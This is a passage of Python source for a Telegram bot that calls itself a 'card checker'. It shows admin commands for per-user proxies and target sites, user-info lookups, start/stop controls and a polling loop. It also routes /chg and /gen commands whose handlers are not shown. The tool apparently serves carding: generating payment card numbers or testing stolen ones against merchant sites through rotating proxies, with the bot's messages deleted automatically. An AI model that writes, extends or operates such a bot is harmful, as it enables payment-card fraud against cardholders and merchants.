        msg_id = send_message(chat_id, "❌ Usage: <code>/asetproxy USER_ID proxy_string</code>\n\nUse /listusers to see user IDs")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    try:
        target_id = int(parts[1])
    except ValueError:
        msg_id = send_message(chat_id, "❌ Invalid user ID! Must be a number.")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    new_proxy = parts[2].strip()
    if target_id not in user_settings:
        user_settings[target_id] = {}
    user_settings[target_id]["proxy"] = new_proxy
    
    proxy_display = new_proxy[:50] + "..." if len(new_proxy) > 50 else new_proxy
    msg_id = send_message(chat_id, f"✅ [ADMIN] Proxy updated for user {target_id}\n\n🔒 Proxy: <code>{proxy_display}</code>")
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_admin_setsite(chat_id, user_id, text, user_msg_id):
    """Admin: /asetsite user_id site_url"""
    msg_ids_to_delete = [user_msg_id]
    
    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    parts = text.split(maxsplit=2)
    if len(parts) < 3:
        msg_id = send_message(chat_id, "❌ Usage: <code>/asetsite USER_ID site_url</code>")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    try:
        target_id = int(parts[1])
    except ValueError:
        msg_id = send_message(chat_id, "❌ Invalid user ID!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    new_site = parts[2].strip()
    if not new_site.startswith("http"):
        new_site = "https://" + new_site
    
    if target_id not in user_settings:
        user_settings[target_id] = {}
    user_settings[target_id]["site"] = new_site
    
    msg_id = send_message(chat_id, f"✅ [ADMIN] Site updated for user {target_id}\n\n🌐 Site: <code>{new_site}</code>")
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_admin_viewuser(chat_id, user_id, text, user_msg_id):
    """Admin: /aview user_id - view a user's settings"""
    msg_ids_to_delete = [user_msg_id]
    
    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        msg_id = send_message(chat_id, "❌ Usage: <code>/aview USER_ID</code>")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    try:
        target_id = int(parts[1].strip())
    except ValueError:
        msg_id = send_message(chat_id, "❌ Invalid user ID!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    site, proxy = get_settings(target_id)
    proxy_display = proxy[:50] + "..." if len(proxy) > 50 else proxy
    
    msg_id = send_message(chat_id,
        f"👤 <b>User {target_id} Settings</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 Site: <code>{site}</code>\n"
        f"🔒 Proxy: <code>{proxy_display}</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━"
    )
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_admin_resetuser(chat_id, user_id, text, user_msg_id):
    """Admin: /areset user_id - reset a user's settings to default"""
    msg_ids_to_delete = [user_msg_id]
    
    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    parts = text.split(maxsplit=1)
    if len(parts) < 2:
        msg_id = send_message(chat_id, "❌ Usage: <code>/areset USER_ID</code>")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    try:
        target_id = int(parts[1].strip())
    except ValueError:
        msg_id = send_message(chat_id, "❌ Invalid user ID!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    if target_id in user_settings:
        del user_settings[target_id]
    
    msg_id = send_message(chat_id, f"✅ [ADMIN] User {target_id} settings reset to default!")
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_listusers(chat_id, user_id, user_msg_id):
    """Admin: /listusers - list all users with custom settings"""
    msg_ids_to_delete = [user_msg_id]
    
    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    if not user_settings:
        msg_id = send_message(chat_id, "📋 No users with custom settings.")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return
    
    text = "👥 <b>Users with Custom Settings</b>\n━━━━━━━━━━━━━━━━━━━━━━\n\n"
    for uid, settings in user_settings.items():
        site = settings.get("site", "default")
        proxy = settings.get("proxy", "default")
        if proxy != "default":
            proxy = proxy[:30] + "..."
        text += f"👤 ID: <code>{uid}</code>\n"
        text += f"   🌐 {site}\n"
        text += f"   🔒 {proxy}\n\n"
    
    msg_id = send_message(chat_id, text)
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_myid(chat_id, user_id, user_msg_id):
    """Handle /myid - show user's Telegram ID"""
    msg_ids_to_delete = [user_msg_id]
    admin_tag = " 👑 ADMIN" if is_admin(user_id) else ""
    msg_id = send_message(chat_id, f"🆔 Your Telegram ID: <code>{user_id}</code>{admin_tag}")
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_chatid(chat_id, message, user_msg_id):
    """Handle /chatid - show current chat/group ID"""
    msg_ids_to_delete = [user_msg_id]
    chat = message.get("chat", {})
    chat_type = chat.get("type", "unknown")
    chat_title = chat.get("title", "")
    chat_username = chat.get("username", "")
    
    if chat_type == "private":
        type_emoji = "👤"
        type_label = "Private Chat"
    elif chat_type == "group":
        type_emoji = "👥"
        type_label = "Group"
    elif chat_type == "supergroup":
        type_emoji = "👥"
        type_label = "Supergroup"
    elif chat_type == "channel":
        type_emoji = "📢"
        type_label = "Channel"
    else:
        type_emoji = "❓"
        type_label = chat_type
    
    text = (
        f"{type_emoji} <b>Chat Info</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 Chat ID: <code>{chat_id}</code>\n"
        f"📋 Type: {type_label}\n"
    )
    if chat_title:
        text += f"📛 Title: {chat_title}\n"
    if chat_username:
        text += f"🔗 Username: @{chat_username}\n"
    text += f"━━━━━━━━━━━━━━━━━━━━━━"
    
    msg_id = send_message(chat_id, text)
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_info(chat_id, user_id, message, user_msg_id):
    """Handle /info - show info of replied user or self
    Reply to someone's message with /info to see their info"""
    msg_ids_to_delete = [user_msg_id]
    
    # Check if replying to someone's message
    reply = message.get("reply_to_message")
    if reply:
        target_user = reply.get("from", {})
    else:
        target_user = message.get("from", {})
    
    target_id = target_user.get("id", 0)
    first_name = target_user.get("first_name", "N/A")
    last_name = target_user.get("last_name", "")
    username = target_user.get("username", "N/A")
    is_bot = target_user.get("is_bot", False)
    language = target_user.get("language_code", "N/A")
    
    full_name = first_name
    if last_name:
        full_name += f" {last_name}"
    
    admin_tag = " 👑" if is_admin(target_id) else ""
    bot_tag = " 🤖" if is_bot else ""
    
    # Get their settings
    site, proxy = get_settings(target_id)
    proxy_display = proxy[:50] + "..." if len(proxy) > 50 else proxy
    
    text = (
        f"👤 <b>User Info</b>{admin_tag}{bot_tag}\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🆔 ID: <code>{target_id}</code>\n"
        f"📛 Name: {full_name}\n"
        f"🔗 Username: @{username}\n"
        f"🌐 Language: {language}\n"
        f"🤖 Bot: {'Yes' if is_bot else 'No'}\n"
    )
    
    # Show settings only for admin
    if is_admin(user_id):
        text += (
            f"\n⚙️ <b>Settings (admin view)</b>\n"
            f"🌐 Site: <code>{site}</code>\n"
            f"🔒 Proxy: <code>{proxy_display}</code>\n"
        )
    
    text += f"━━━━━━━━━━━━━━━━━━━━━━"
    
    msg_id = send_message(chat_id, text)
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

# ==================== BOT CONTROL (ADMIN) ====================

def handle_stopbot(chat_id, user_id, user_msg_id):
    """Admin: /stopbot - pause bot from processing new commands"""
    global bot_running
    msg_ids_to_delete = [user_msg_id]

    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    if not bot_running:
        msg_id = send_message(chat_id,
            "⚠️ <b>Bot is already stopped!</b>\n"
            "Use <code>/startbot</code> to resume."
        )
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    bot_running = False
    msg_id = send_message(chat_id,
        "🛑 <b>Bot has been STOPPED!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "⏸️ Bot will no longer process commands.\n"
        "Use <code>/startbot</code> to resume."
    )
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_startbot(chat_id, user_id, user_msg_id):
    """Admin: /startbot - resume bot processing"""
    global bot_running
    msg_ids_to_delete = [user_msg_id]

    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    if bot_running:
        msg_id = send_message(chat_id,
            "✅ <b>Bot is already running!</b>\n"
            "Use <code>/stopbot</code> to pause."
        )
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    bot_running = True
    msg_id = send_message(chat_id,
        "▶️ <b>Bot has been STARTED!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "✅ Bot is now processing commands again.\n"
        "Use <code>/stopbot</code> to pause."
    )
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

def handle_botstatus(chat_id, user_id, user_msg_id):
    """Admin: /botstatus - check if bot is running or stopped"""
    msg_ids_to_delete = [user_msg_id]

    if not is_admin(user_id):
        msg_id = send_message(chat_id, "❌ Admin only!")
        msg_ids_to_delete.append(msg_id)
        schedule_delete_multiple(chat_id, msg_ids_to_delete)
        return

    if bot_running:
        status_text = (
            "✅ <b>Bot Status: RUNNING</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "▶️ Bot is actively processing commands.\n"
            "Use <code>/stopbot</code> to pause."
        )
    else:
        status_text = (
            "🛑 <b>Bot Status: STOPPED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "⏸️ Bot is paused, not processing commands.\n"
            "Use <code>/startbot</code> to resume."
        )

    msg_id = send_message(chat_id, status_text)
    msg_ids_to_delete.append(msg_id)
    schedule_delete_multiple(chat_id, msg_ids_to_delete)

# ==================== MAIN LOOP ====================

def process_message(message):
    """Process a single message"""
    chat_id = message["chat"]["id"]
    user_msg_id = message["message_id"]
    text = message.get("text", "")
    user = message.get("from", {})
    user_id = user.get("id", 0)
    user_name = user.get("first_name", "Unknown")
    if user.get("username"):
        user_name = f"@{user['username']}"

    if not text:
        return

    text_lower = text.lower().strip()

    # Bot control commands always work (even when bot is stopped)
    if text_lower.startswith("/stopbot"):
        handle_stopbot(chat_id, user_id, user_msg_id)
        return
    elif text_lower.startswith("/startbot"):
        handle_startbot(chat_id, user_id, user_msg_id)
        return
    elif text_lower.startswith("/botstatus"):
        handle_botstatus(chat_id, user_id, user_msg_id)
        return

    # If bot is stopped, ignore all other commands
    if not bot_running:
        return

    if text_lower.startswith("/start") or text_lower.startswith("/help"):
        handle_start(chat_id, user_msg_id)
    elif text_lower.startswith("/chatid"):
        handle_chatid(chat_id, message, user_msg_id)
    elif text_lower.startswith("/chg"):
        handle_chg(chat_id, user_id, text, user_name, user_msg_id)
    elif text_lower.startswith("/gen"):
        handle_gen(chat_id, text, user_msg_id)
    elif text_lower.startswith("/myid"):
        handle_myid(chat_id, user_id, user_msg_id)
    elif text_lower.startswith("/info"):
        handle_info(chat_id, user_id, message, user_msg_id)
    elif text_lower.startswith("/setproxy"):
        handle_setproxy(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/setsite"):
        handle_setsite(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/settings"):
        handle_settings(chat_id, user_id, user_msg_id)
    elif text_lower.startswith("/resetproxy"):
        handle_resetproxy(chat_id, user_id, user_msg_id)
    elif text_lower.startswith("/resetsite"):
        handle_resetsite(chat_id, user_id, user_msg_id)
    elif text_lower.startswith("/listsite"):
        handle_listsite(chat_id, user_id, text, user_msg_id)
    # Admin commands
    elif text_lower.startswith("/adefaultsite"):
        handle_admin_defaultsite(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/adefaultproxy"):
        handle_admin_defaultproxy(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/asetproxy"):
        handle_admin_setproxy(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/asetsite"):
        handle_admin_setsite(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/aview"):
        handle_admin_viewuser(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/areset"):
        handle_admin_resetuser(chat_id, user_id, text, user_msg_id)
    elif text_lower.startswith("/listusers"):
        handle_listusers(chat_id, user_id, user_msg_id)

def main():
    """Main bot loop with long polling"""
    print("=" * 60)
    print("  TELEGRAM CARD CHECKER BOT")
    print("=" * 60)

    bot_info = get_bot_info()
    if not bot_info:
        print("[ERROR] Invalid bot token! Cannot connect to Telegram API.")
        return

    print(f"[OK] Bot connected: @{bot_info.get('username', 'unknown')}")
    print(f"[OK] Bot name: {bot_info.get('first_name', 'unknown')}")
    print(f"[OK] API: {API_ENDPOINT}")
    print(f"[OK] Default site: {DEFAULT_SITE}")
    print(f"[OK] Default proxy: {DEFAULT_PROXY[:50]}...")
    print(f"[OK] Auto-delete: {AUTO_DELETE_DELAY}s")
    print(f"[OK] Settings: per-user (individual)")
    print("=" * 60)
    print("[*] Listening for messages... (Press Ctrl+C to stop)\n")

    offset = None

    while True:
        try:
            updates = get_updates(offset=offset, timeout=30)

            if not updates or not updates.get("ok"):
                time.sleep(1)
                continue

            for update in updates.get("result", []):
                offset = update["update_id"] + 1

                if "message" in update:
                    message = update["message"]
                    thread = threading.Thread(target=process_message, args=(message,))
                    thread.daemon = True
                    thread.start()

        except KeyboardInterrupt:
            print("\n[*] Bot stopped by user.")
            break
        except Exception as e:
            print(f"[ERROR] {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
